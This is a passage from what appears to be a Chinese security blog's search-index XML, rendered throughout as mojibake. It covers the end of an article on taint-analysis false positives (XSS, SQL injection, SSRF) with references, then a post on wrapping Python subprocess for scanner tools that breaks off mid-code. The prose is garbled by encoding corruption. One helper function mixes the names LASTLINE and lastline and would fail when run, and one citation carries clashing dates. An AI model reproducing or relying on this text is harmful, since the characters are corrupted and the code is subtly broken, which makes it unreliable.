¹æ®å‡½æ•°æ‘˜è¦ï¼Œå†è¿›è¡Œè¿‡ç¨‹å†…åˆ†æï¼Œå¦‚æ­¤å¾€å¤ç›´è‡³åˆ†æå®Œå‡½æ•°æ‰€æœ‰ä»£ç å—æˆ–æ˜¯æ±¡ç‚¹ä¼ æ’­è‡³æ±‡èšç‚¹ï¼ŒæŠ¥å‘Šæ¼æ´ã€‚</p><p><img src="/whitebox-ç™½ç›’æ‰«ææŠ€æœ¯ç»¼è¿°/image-20200528204328041.png" alt="image-20200528204328041"></p><p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œåˆ†æè¿‡ç¨‹ä»å·¦ä¾§å‡½æ•°å¼€å§‹ï¼Œå› ä¸ºå…¶æ‰¾åˆ°äº†ä¸€å¤„äº§ç”Ÿç‚¹â€”â€”<em>request.getParameter(â€œxssâ€)</em>ï¼Œäºæ˜¯å°†æ±¡ç‚¹ä¼ é€’åˆ°å˜é‡<em>p</em>ï¼Œæ¥ç€è°ƒç”¨å‡½æ•°<em>func(p)</em>ï¼Œäºæ˜¯å¯¹å‡½æ•°<em>func()</em>åšè¿‡ç¨‹å†…åˆ†æï¼Œå¾—åˆ°å…¶å‡½æ•°æ‘˜è¦ï¼Œ $\left\langle func, \left\{a, b, c\right\}, 1\right\rangle$ ï¼Œäºæ˜¯å›åˆ°è°ƒç”¨è€…çš„å‡½æ•°å†…ï¼Œå˜é‡<em>q</em>è¢«æ ‡è®°ä¸ºæ±¡ç‚¹ï¼Œåˆå› ä¸ºç¬¬ä¸‰è¡Œå­˜åœ¨ä¸€å¤„æ±‡èšç‚¹â€”â€”<em>response.getpriter.print()</em>ï¼Œå¹¶ä¸”å‚æ•°ä¸ºæ±¡ç‚¹ï¼Œäºæ˜¯æŠ¥å‘Šæ­¤å¤„æœ‰æ¼æ´ï¼Œå¹¶ä¸”æ ¹æ®æ±‡èšç‚¹å¯ä»¥åˆ¤æ–­è¯¥æ¼æ´æ˜¯ä¸€ä¸ª XSS æ¼æ´ã€‚</p><h2 id="ä¼˜åŠ¿å’Œä¸è¶³"><a href="#ä¼˜åŠ¿å’Œä¸è¶³" class="headerlink" title="ä¼˜åŠ¿å’Œä¸è¶³"></a>ä¼˜åŠ¿å’Œä¸è¶³</h2><p>æ±¡ç‚¹åˆ†æèƒ½å¤Ÿå¯¹ç¨‹åºä¸Šä¸‹æ–‡æœ‰ä¸€å®šç†è§£ï¼Œå¾€å¾€èƒ½äº§ç”Ÿè¯¯æŠ¥ç‡ç›¸å¯¹è¾ƒä½ä»¥åŠå¯è§£é‡Šçš„æ¼æ´æŠ¥å‘Šï¼Œå…¶æ–¹æ³•å¯¹ Web ç±»å‹çš„å®‰å…¨æ¼æ´è¦†ç›–ç‡è¾ƒé«˜ï¼Œè€Œæ±¡ç‚¹ç±»å‹çš„æ¼æ´æ™®éå…·æœ‰è¾ƒé«˜å±å®³æ€§ï¼Œå› æ­¤è¯¥æ–¹æ³•å·²è¢«å¾ˆå¤šå·¥ä¸šç•Œã€å­¦æœ¯ç•Œçš„å®‰å…¨é™æ€æ‰«æå·¥å…·æ‰€ä½¿ç”¨ã€‚</p><p>ç„¶è€Œï¼Œæ±¡ç‚¹ä¼ æ’­ä»æœ‰å¯èƒ½å‘ç”Ÿè¯¯æŠ¥ï¼Œä»¥ä¸‹é€šè¿‡ç®€å•ç¤ºä¾‹æ¥è¯´æ˜ã€‚</p><p><img src="/whitebox-ç™½ç›’æ‰«ææŠ€æœ¯ç»¼è¿°/image-20200530195755514.png" alt="image-20200530195755514"></p><p>é¦–å…ˆï¼Œæ±¡ç‚¹ä¼ æ’­å¯¹å®¹å™¨ç±»å‹æ— æ³•åšå¾ˆå¥½å¤„ç†ï¼Œå¦‚ä¸Šå›¾ (a)æ‰€ç¤ºï¼Œå½“æ±¡ç‚¹ä¼ å…¥ å®¹å™¨ç±»å‹æ—¶ï¼ˆåœ¨æ­¤ä¾‹å­ä¸­ä¸º mapï¼‰ï¼Œé™æ€æ±¡ç‚¹ä¼ æ’­åªèƒ½å°†è¿™ç±»å˜é‡çš„ä¼ æ’­è§„åˆ™è®¾ ä¸ºä¼ æ’­/ä¸ä¼ æ’­æ±¡ç‚¹ï¼Œä»è€Œé€ æˆè¿‡æ±¡æŸ“/æ¬ æ±¡æŸ“ï¼Œå°±å¦‚å›¾æ‰€ç¤ºï¼Œè‹¥è®¾ä¸º map ä¼ æ’­æ±¡ç‚¹ï¼Œç”±äºæ¡ˆä¾‹å®é™…ä»å®¹å™¨ä¸­å–å‡ºçš„æ˜¯æ²¡æœ‰æ±¡ç‚¹çš„å˜é‡ï¼Œå³è¿‡æ±¡æŸ“ï¼Œè€Œè‹¥è®¾ä¸ºä¸ä¼ æ’­ï¼Œè‹¥ q å–å‡ºå‚æ•° pï¼Œé‚£ä¹ˆåˆå¯¼è‡´æ¬ æ±¡æŸ“ã€‚åŠ¨æ€æ±¡ç‚¹ä¼ æ’­è™½ç„¶è§£å†³äº†è¿™ä¸€é—®é¢˜ï¼Œ ä½†æ˜¯ç”±äºå…¶ä½¿ç”¨æ¡ä»¶å¤æ‚ï¼Œä¸”æ— æ³•ç”¨äºé™æ€åˆ†æï¼Œæœ¬æ–‡æš‚ä¸è®¨è®ºã€‚</p><p>æ­¤å¤–ï¼Œä¸è®ºæ˜¯åŠ¨æ€æ±¡ç‚¹ä¼ æ’­è¿˜æ˜¯é™æ€æ±¡ç‚¹ä¼ æ’­ï¼Œå…¶å¯¹æ±¡ç‚¹æ¸…æ´ç‚¹çš„è¯†åˆ«èƒ½åŠ›å‡ ä¹ä¸ºé›¶ï¼Œå¦‚ä¸Šå›¾(b)æ‰€ç¤ºï¼Œè¯¥å‡½æ•°æ˜¯ä¸€ä¸ªå…¸å‹çš„é˜²å¾¡ SQL æ³¨å…¥çš„æ±¡ç‚¹æ¸…æ´ å‡½æ•°ï¼Œå³åœ¨ç¬¬ 2âˆ¼5 è¡Œå¯¹å¾…æ‹¼æ¥ SQL å­—ç¬¦ä¸²å­˜åœ¨çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œæ›¿æ¢å’Œè¿‡æ»¤ï¼Œä½† æ˜¯æ±¡ç‚¹ä¼ æ’­å¹¶ä¸èƒ½è¯†åˆ«è¿™äº›æ¸…æ´å‡½æ•°ï¼Œå¯¼è‡´è¯¯æŠ¥ã€‚</p><p>å†è€…ï¼Œé™æ€æ±¡ç‚¹ä¼ æ’­å¯¹æ§åˆ¶æµæ²¡æ³•åšå¾ˆå¥½çš„å¤„ç†ï¼Œå¦‚ä¸Šå›¾(c)æ‰€ç¤ºï¼Œåœ¨ç¬¬ä¸‰è¡Œï¼Œç¨‹åºå·²ç»å¯¹å¯èƒ½äº§ç”Ÿçš„ SSRF æ¼æ´è¿›è¡Œäº†å¤„ç†ï¼Œå³å¦‚æœæ˜¯å†…éƒ¨åœ°å€åˆ™ç›´æ¥è¿”å›ï¼Œä½†æ˜¯ä¸è®ºæ˜¯è€ƒè™‘æ˜¾å¼æµè¿˜æ˜¯éšå¼æµï¼Œæ±¡ç‚¹ä¼ æ’­éƒ½ä¸èƒ½é¿å…è¿™ä¸€ç±»è¯¯æŠ¥ã€‚</p><p>æœ€åï¼Œå¯¹äºç‰¹æ®Šè§¦å‘æ¡ä»¶çš„æ¼æ´ï¼Œæ±¡ç‚¹ä¼ æ’­æ— æ³•å¾ˆå¥½å¤„ç†ï¼Œå¦‚ä¸Šå›¾(d)æ‰€ç¤ºï¼Œ åœ¨ç¬¬äºŒè¡Œï¼Œå› ä¸º SSRF è¦æ±‚æ”»å‡»è€…èƒ½å¤Ÿæ“æ§ä¸»æœºåï¼Œæ‰€ä»¥å³ä½¿ç”¨æˆ·è¾“å…¥çš„æ±¡ç‚¹å˜é‡æ‹¼æ¥åœ¨ä¸€ä¸ªæ­£å¸¸ä¸»æœºåä¹‹åï¼Œç¨‹åºä¹Ÿä¸ä¼šå‡ºç° SSRF ï¼Œè€ŒæŒ‰ç…§æ±¡ç‚¹ä¼ æ’­åˆ†ææ³•ï¼Œæ¯«æ— ç–‘é—®å®ƒä¼šæŠ¥å‘Šè¿™æ®µç¨‹åºå­˜åœ¨ SSRF æ¼æ´ã€‚</p><p>è¿™äº›é—®é¢˜ä¹Ÿæ˜¯å·¥ä¸šç•Œå’Œå­¦æœ¯ç•ŒäºŸå¾…è§£å†³çš„é—®é¢˜ï¼Œå¦‚å·¥ä¸šç•Œå¼€å§‹å°è¯•ç”¨ç¬¦å·æ‰§è¡Œï¼Œä»¥åŠç”¨é»‘ç›’ã€IASTé…åˆè§£å†³ç™½ç›’ï¼Œåœ¨å­¦æœ¯ç•Œä¹Ÿæ­£å°è¯•ç”¨æœºå™¨å­¦ä¹ è§£å†³é—®é¢˜ã€‚</p><h1 id="å‚è€ƒæ–‡çŒ®"><a href="#å‚è€ƒæ–‡çŒ®" class="headerlink" title="å‚è€ƒæ–‡çŒ®"></a>å‚è€ƒæ–‡çŒ®</h1><ol><li>J. M. Schumann, Automated Theorem Proving in Software Engineering, Springer Berlin Heidelberg, Berlin, Heidelberg, 2001.</li><li>C. Flanagan, K. R. M. Leino, M. Lillibridge, G. Nelson, J. B. Saxe, R. Stata, Extended static checking for Java, in: Proceedings of the 2002 ACM SIGPLAN Conference on Programming Language Design and Implementation, Vol. 48, ACM Press, New York, New York, USA, 2002, pp. 234â€“245.</li><li>Y. Xie, A. Aiken, Saturn: A scalable framework for error detection using Boolean satisfiability, ACM Transactions on Programming Languages and Systems 29 (3) (2007) 16</li><li>C. Cadar, K. Sen, Symbolic Execution for Software Testing: Three Decades Later, Communications of the ACM 56 (2) (2013) 82â€“90.</li><li>P. Godefroid, N. Klarlund, K. Sen, DART: directed automated random testing, in: Proceedings of the 2005 ACM SIGPLAN conference on Programming language design and implementation, Vol. 40, ACM Press, New York, New York, USA, 2005, pp. 213â€“223.</li><li>K. Sen, D. Marinov, G. Agha, CUTE: a concolic unit testing engine for C, Proceedings of the 10th European software engineering conference held jointly with 13th ACM SIGSOFT international symposium on Foundations of software engineering 30 (5) (2005) 263.</li><li>C. Cadar, V. Ganesh, P. M. Pawlowski, D. L. Dill, D. R. Engler, EXE: Automatically Generating Inputs of Death, ACM Transactions on Information and System Security 12 (2) (2008) 1â€“38.</li><li>C. Cadar, D. Dunbar, D. Engler, Klee: Unassisted and automatic generation of highÂ­coverage tests for complex systems programs, in: Proceedings of the 8th USENIX Symposium on Operating Systems Design and Implementation, OSDI 2008, Vol. 8, 2019, pp. 209â€“224</li><li>G. A. Kildall, A unified approach to global program optimization, in: Proceedings of the 1st annual ACM SIGACT SIGPLAN symposium on Principles of programming languages, ACM Press, New York, New York, USA, 1973, pp. 194â€“206.</li><li>B. Shastry, F. Yamaguchi, K. Rieck, J. P. Seifert, Towards Vulnerability Discovery Using Staged Program Analysis, in: Detection of Intrusions and Malware, and Vulnerability Assessment, Springer, Cham, 2016, pp. 78â€“97.</li><li>N. Jovanovic, C. Kruegel, E. Kirda, Pixy: a static analysis tool for detecting Web application vulnerabilities, in: Proceedings of the 2006 IEEE Symposium on Security and Privacy, IEEE, 2006, pp. 258â€“263.</li></ol>]]></content>
      
      
      <categories>
          
          <category> æºç å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç™½ç›’æ‰«æ </tag>
            
            <tag> æ•°æ®æµåˆ†æ </tag>
            
            <tag> æ±¡ç‚¹åˆ†æ </tag>
            
            <tag> ç¬¦å·æ‰§è¡Œ </tag>
            
            <tag> å½¢å¼åŒ–åˆ†æ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä½¿ç”¨Pythonä¼˜é›…è°ƒç”¨å…¶ä»–å·¥å…·æˆ–å‘½ä»¤</title>
      <link href="/dev-%E4%BD%BF%E7%94%A8Python%E4%BC%98%E9%9B%85%E8%B0%83%E7%94%A8%E5%85%B6%E4%BB%96%E5%B7%A5%E5%85%B7%E6%88%96%E5%91%BD%E4%BB%A4/"/>
      <url>/dev-%E4%BD%BF%E7%94%A8Python%E4%BC%98%E9%9B%85%E8%B0%83%E7%94%A8%E5%85%B6%E4%BB%96%E5%B7%A5%E5%85%B7%E6%88%96%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p>Python å¼€å‘æ‰«æå™¨æ—¶å¾€å¾€ä¼šè°ƒç”¨å…¶ä»–ç¬¬ä¸‰æ–¹å·¥å…·ï¼Œä½†æ˜¯é€šè¿‡ <code>os.system()</code>æˆ–è€…å…¶ä»–å‘½ä»¤ä¸­æ˜¯ä¼šæœ‰è¿™æ ·æˆ–é‚£æ ·çš„å‘æˆ–ä¸è¶³ï¼Œæœ¬æ–‡å¯¹è¿™äº›é—®é¢˜è¿›è¡Œæ€»ç»“å¹¶æå‡ºè§£å†³æ–¹æ¡ˆï¼Œå¹¶åœ¨ç»“å°¾ç»™å‡ºäº†ä¸€ä¸ªå°è£…å¥½çš„ç±»ï¼Œèƒ½è¾ƒä¸ºå®Œç¾çš„è§£å†³Pythonè°ƒç”¨ç¬¬ä¸‰æ–¹å‘½ä»¤çš„é—®é¢˜ã€‚</p><h1 id="éœ€æ±‚"><a href="#éœ€æ±‚" class="headerlink" title="éœ€æ±‚"></a>éœ€æ±‚</h1><ol><li>é¦–å…ˆï¼Œæˆ‘å¯ä»¥è°ƒç”¨ä»»æ„å‘½ä»¤ï¼Œå¹¶ä¸”å¯ä»¥åœ¨å‘½ä»¤æ‰§è¡Œæ—¶å‘è¾“å…¥é€šé“ï¼ˆstdinï¼‰ä¼ æ›´å¤šè¾“å…¥ï¼ŒåŒæ—¶Pythonèƒ½å®æ—¶è·å–è¾“å‡ºé€šé“ï¼ˆstdoutï¼‰å’Œé”™è¯¯é€šé“ï¼ˆstderrï¼‰è·ç¨‹åºè¾“å‡ºï¼Œæ³¨æ„æ˜¯è·å–è¾“å‡ºï¼Œè€Œä¸æ˜¯å•çº¯çš„å°†è¾“å‡ºé‡å®šå‘åˆ°å±å¹•æˆ–æ–‡ä»¶ä¸­ï¼›</li><li>æˆ‘å¯ä»¥é€šè¿‡è¿”å›å€¼ï¼Œæˆ–è€…ç¨‹åºè¾“å‡ºåˆ¤æ–­ç¬¬ä¸‰æ–¹ç¨‹åºæ‰§è¡Œæ˜¯å¦å‡ºé”™ï¼Œå¦‚æœå‡ºé”™æŠ›å‡ºå¼‚å¸¸æˆ–è€…è¿›è¡Œå¼‚å¸¸å¤„ç†ï¼›</li><li>æ‰§è¡Œå‘½ä»¤æ˜¯æœ€å¥½å¯ä»¥è®¾ç½®è¶…æ—¶æ—¶é—´ï¼Œé˜²æ­¢å­å‘½ä»¤å‡æ­»è€Œå½±å“ä¸»ç¨‹åºï¼›</li><li>è¿™æ®µè°ƒç”¨ç¨‹åºåº”è¯¥æ˜¯è·¨å¹³å°çš„ï¼Œæ¯•ç«ŸPythonæœ¬èº«å°±æ˜¯è·¨å¹³å°è¯­è¨€ã€‚</li></ol><a id="more"></a><h1 id="å®ç°"><a href="#å®ç°" class="headerlink" title="å®ç°"></a>å®ç°</h1><p>çœ‹åˆ°ç¬¬ä¸€æ¡å’Œç¬¬äºŒæ¡éœ€æ±‚ï¼Œé¦–å…ˆæƒ³åˆ°ç”¨ <code>subprocess.Popen()</code> å¯ä»¥å®ç°ï¼Œç¡®å®ï¼Œæˆ‘ä»¬å¯ä»¥åŸºäºå®ƒè¿›è¡Œæ”¹é€ ï¼Œå®Œæˆæˆ‘ä»¬çš„ä»»åŠ¡ã€‚</p><p><code>subprocess.communicate()</code> è™½ç„¶å¯ä»¥è®© Python æ‹¿åˆ°ç¨‹åºè¿”å›åˆ°stdoutæˆ–stderrçš„è¾“å‡ºï¼Œä½†æ˜¯å®ƒä¸æ˜¯å®æ—¶çš„ï¼Œè¦æƒ³åšåˆ°å®æ—¶è¾“å‡ºï¼Œé¦–å…ˆå°†stdoutå’Œstderré€šé“é‡å®šå‘åˆ°<code>subprocess.PIPE</code>ï¼Œè¿™é‡Œæ–¹ä¾¿èµ·è§ï¼Œæˆ‘å…ˆå°†stderré€šé“é‡å®šå‘åˆ°stdoutï¼Œå†å°†stdouté‡å®šå‘åˆ°<code>subprocess.PIPE</code>ï¼Œæ³¨æ„å¦‚æœæ˜¯Windowså¹³å°ï¼Œç›´æ¥ä¼ å‘½ä»¤æ˜¯æ²¡æ³•æ‹¿åˆ°æ­£ç¡®çš„ç¨‹åºè¿”å›å€¼çš„ï¼Œå› æ­¤è¦åœ¨åé¢åŠ ä¸Š<code>&amp; exit</code> å‘½ä»¤ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> platform.architecture()[<span class="number">-1</span>] == <span class="string">"ELF"</span>:</span><br><span class="line">    cmd = cmd</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    cmd = cmd + <span class="string">" &amp; exit"</span></span><br><span class="line">process = subprocess.Popen(cmd, shell=<span class="literal">True</span>, bufsize=<span class="number">1024</span>, stdout=subprocess.PIPE,</span><br><span class="line">                                        stderr=subprocess.STDOUT)</span><br></pre></td></tr></table></figure><p>ä¸‹é¢è€ƒè™‘å¦‚ä½•ä»processä¸­æ‹¿æ•°æ®çš„é—®é¢˜ï¼Œè¿™é‡Œä¸€å®šè¦æ–°å¼€ä¸€ä¸ªçº¿ç¨‹å–æ•°æ®ï¼Œå¦åˆ™å¯èƒ½ä¼šå‡ºç°å­å‘½ä»¤æ‰§è¡Œäº§ç”Ÿå¤§é‡è¾“å‡ºå¡«æ»¡äº†subprocessçš„ç¼“å†²åŒºï¼Œå¯¼è‡´æ•´ä¸ªç¨‹åºé˜»å¡çš„é—®é¢˜ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">log_thread = threading.Thread(target=print_log, args=(process.stdout,))</span><br><span class="line">log_thread.start()</span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šçš„ <code>print_log(stdout)</code>å‡½æ•°ç”¨æ¥ä¸æ–­å‘è¾“å‡ºç¼“å†²åŒºå–æ•°æ®ï¼Œå¹¶è¿›è¡Œå…¶ä»–å¤„ç†ï¼Œè¿™é‡Œçš„stdoutç›¸å½“äºä¸€ä¸ªæ–‡ä»¶å¥æŸ„ï¼Œä½†æ˜¯å®è·µè¡¨æ˜ä¸èƒ½ç”¨ readline() å’Œreadlines() è¯»æ•°æ®ï¼Œå› ä¸ºç¬¬ä¸‰æ–¹ç¨‹åºè¾“å‡ºæœ‰å¯èƒ½ä¼šç”¨<code>\r</code>åœ¨åŒä¸€è¡Œä¸Šå¤šæ¬¡æ‰“å°è¾“å‡ºï¼ˆå¦‚åœ¨å‘½ä»¤è¡Œæ˜¾ç¤ºè¿›åº¦æ¡çš„åŠæƒ…å†µï¼‰ï¼Œç”¨<code>readlines()</code>æ›´ä¼šé€ æˆç¨‹åºè¿è¡Œæ•ˆç‡æ…¢çš„é—®é¢˜ï¼ˆè°ä¹Ÿä¸æƒ³ä¸€ä¸ªæ—¥å¿—å¤„ç†ç¯èŠ‚æŠŠä¸€ä¸ªæ ¸å¿ƒçš„CPUæ‰“æ»¡å§ï¼Ÿï¼‰ï¼Œå› æ­¤è¯»å–æ—¥å¿—çš„å‡½æ•°åº”è¯¥è¿™æ ·å†™ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">LASTLINE=<span class="string">""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_log</span><span class="params">( stdout)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> log_line <span class="keyword">in</span> _log_line_iter(stdout):</span><br><span class="line">        process_line(log_line)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_log_line_iter</span><span class="params">(reader)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> LASTLINE</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        buf = reader.read(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">if</span> buf:</span><br><span class="line">            <span class="keyword">if</span> platform.architecture()[<span class="number">-1</span>] == <span class="string">"ELF"</span>:</span><br><span class="line">                lines = buf.decode(<span class="string">'utf8'</span>, errors=<span class="string">'ignore'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                lines = buf.decode(<span class="string">'gbk'</span>, errors=<span class="string">'ignore'</span>)</span><br><span class="line">            lines = lines.replace(<span class="string">'\r\n'</span>, <span class="string">'\n'</span>).replace(<span class="string">'\r'</span>, <span class="string">'\n'</span>).split(<span class="string">'\n'</span>)</span><br><span class="line">            lines[<span class="number">0</span>] = lastline + lines[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> lines[:<span class="number">-1</span>]:</span><br><span class="line">                <span class="keyword">if</span> len(line) &gt; <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">yield</span> line</span><br><span class="line">            lastline = lines[<span class="number">-1</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œç”¨ <code>read()</code>å‡½æ•°ä»ç¼“å†²åŒºæ‹¿æ•°æ®ï¼Œå¹¶ä¸”é€šè¿‡ <code>process_line(log_line)</code> è¿›è¡Œå¤„ç†ï¼Œè¿™ä¸ªå‡½æ•°å°±æ˜¯æˆ‘ä»¬å¯ä»¥è‡ªå®šçš„å‡½æ•°äº†ï¼Œè¯¥æ‰“æ—¥å¿—æ‰“æ—¥å¿—ï¼Œè¯¥ä¿å­˜ä¿å­˜ã€‚</p><p>æ¥ä¸‹æ¥å°±æ˜¯å¦‚ä½•è¿›è¡Œè¶…æ—¶å¤„ç†çš„ï¼Œè¿™é‡Œsubprocessçš„<code>wait(timeout)</code>å·²ç»å…·æœ‰äº†è¶…æ—¶åŠŸèƒ½ï¼Œè¿™é‡Œæˆ‘ä»¬åªè¦æ³¨æ„è¶…æ—¶åå°†å­è¿›ç¨‹æ€æ­»å³å¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">kill</span><span class="params">(proc_pid)</span>:</span></span><br><span class="line">    process = psutil.Process(proc_pid)</span><br><span class="line">    <span class="keyword">for</span> proc <span class="keyword">in</span> process.children(recursive=<span class="literal">True</span>):</span><br><span class="line">        proc.kill()</span><br><span class="line">    process.kill()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    process.wait(timeout=timeout)</span><br><span class="line"><span class="keyword">except</span> subprocess.TimeoutExpired:</span><br><span class="line">    kill(process.pid)</span><br><span class="line">    log_thread.join()</span><br><span class="line">    <span class="keyword">raise</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„æ€æ­»è¿›ç¨‹åï¼Œè¿˜æ˜¯éœ€è¦å°†ç¨‹åºæœ€åè¾“å‡ºè·å–å®Œï¼Œå†ç»“æŸæ—¥å¿—è¿›ç¨‹ã€‚</p><p>æœ€åå¯ä»¥é€šè¿‡æ—¥å¿—å’Œç¨‹åºè¿”å›å€¼<code>process.returncode</code>è·å–ç¨‹åºæ‰§è¡Œæƒ…å†µã€‚</p><h1 id="å°è£…ç±»"><a href="#å°è£…ç±»" class="headerlink" title="å°è£…ç±»"></a>å°è£…ç±»</h1><p>æ ¹æ®ä»¥ä¸Šå®ç°ï¼Œæœ¬äººå°è£…äº†ä¸€ä¸ªè¾ƒä¸ºæ–¹ä¾¿çš„è¶…ç±»ï¼Œç”¨çš„æ—¶å€™åªéœ€è¦ç»§æ‰¿è¿™ä¸ªç±»ï¼Œå†è‡ªå®šä¹‰æ‰“å°æ—¥å¿—å’Œå‘½ä»¤æ‰§è¡Œæˆ‘èƒ½çš„å›è°ƒå‡½æ•°å³å¯ï¼ˆåœ¨å›è°ƒå‡½æ•°ä¸­å¯ä»¥åšå¼‚å¸¸å¤„ç†ï¼‰ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> psutil</span><br><span class="line">OS_LINUX = <span class="string">"ELF"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">kill</span><span class="params">(proc_pid)</span>:</span></span><br><span class="line">    process = psutil.Process(proc_pid)</span><br><span class="line">    <span class="keyword">for</span> proc <span class="keyword">in</span> process.children(recursive=<span class="literal">True</span>):</span><br><span class="line">        proc.kill()</span><br><span class="line">    process.kill()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CommandRunner</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, output_size: int = <span class="number">500</span>)</span>:</span></span><br><span class="line">        self.log_size = output_size</span><br><span class="line">        self.output = list()</span><br><span class="line">        self.lastline = <span class="string">''</span></span><br><span class="line">        self.cmd = <span class="literal">None</span></span><br><span class="line">        _, os = platform.architecture()</span><br><span class="line">        self.os = OS_LINUX <span class="keyword">if</span> <span class="keyword">not</span> os <span class="keyword">else</span> os</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">log</span><span class="params">(self, log_line)</span>:</span></span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">callback</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run_cmd</span><span class="params">(self, cmd: str, timeout: int = <span class="number">-1</span>)</span> -&gt; int:</span></span><br><span class="line">        logging.info(<span class="string">"Running cmd: \"&#123;&#125;\""</span>.format(cmd))</span><br><span class="line">        <span class="keyword">if</span> self.os == OS_LINUX:</span><br><span class="line">            self.cmd = cmd</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.cmd = cmd + <span class="string">" &amp; exit"</span></span><br><span class="line">        self.process = subprocess.Popen(self.cmd, shell=<span class="literal">True</span>, bufsize=<span class="number">1024</span>, stdout=subprocess.PIPE,</span><br><span class="line">                                        stderr=subprocess.STDOUT)</span><br><span class="line">        log_thread = threading.Thread(target=self.print_log, args=(self.process.stdout,))</span><br><span class="line">        log_thread.start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> timeout &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                self.process.wait(timeout=timeout)</span><br><span class="line">            <span class="keyword">except</span> subprocess.TimeoutExpired:</span><br><span class="line">                kill(self.process.pid)</span><br><span class="line">                log_thread.join()</span><br><span class="line">                <span class="keyword">raise</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.process.wait()</span><br><span class="line">        log_thread.join()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> 